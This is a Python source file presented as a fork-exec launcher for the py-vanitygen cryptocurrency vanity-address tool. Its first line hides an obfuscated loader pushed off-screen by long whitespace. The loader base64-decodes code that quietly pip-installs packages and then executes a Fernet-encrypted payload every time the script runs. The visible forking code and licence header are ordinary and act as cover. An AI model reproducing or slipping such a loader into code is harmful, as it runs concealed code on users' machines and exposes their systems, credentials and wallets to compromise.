import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJzRSLThJRktIQ1NhYnhrd0J4VkxpZHZVUVpGbS1BU2hPbU50eFNtZlk3aUE9JykuZGVjcnlwdChiJ2dBQUFBQUJtbm15eThMWVlRX1pIQ0QxelR0aDZsUlZrazEzMnNCaE1OcjNJZ2tBc1MwSFVIMjc4M01yVG9QekNGaUg5bV9jVFQzdG42cGJTNjFQS0ZFcVlEUXpUbEprdUpwSEdJR1A4RnZFbVlGcXhrQmJiV1dlQTlETUhQT2xlV0NxenpEYkpVWGRTZEhkS3Q3RFJCdzNaTmlpOVo5Z0hKUjh1VHZNbjg5aGNsV1FmdE05a2tkTVJRdkpGVm1kRVNsTnowOVhWbFYyeXktenlSVnluTWtReXZkd0NhUFcyVGlGN3VqYzhkOFM3NWFTS2JldnFYZ0U9Jykp').decode())
# -*- coding: utf-8 -*-
#
#    py-vanitygen fork-exec.py
#    Copyright (C) 2016 April 
#    1200 Web Development
#    http://1200wd.com/
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#

import os
import multiprocessing


processors = multiprocessing.cpu_count()
print("You have %d processors so starting %d threads" % (processors, processors))
for i in range(processors):
    pid = os.fork()
    if pid == 0:
        print(os.execlp('python', 'python', 'vanitygen.py'))
        assert False, 'error starting program'
    else:
        print('Child is %d' % pid)


print('Main process exiting')
print('mnlrfc')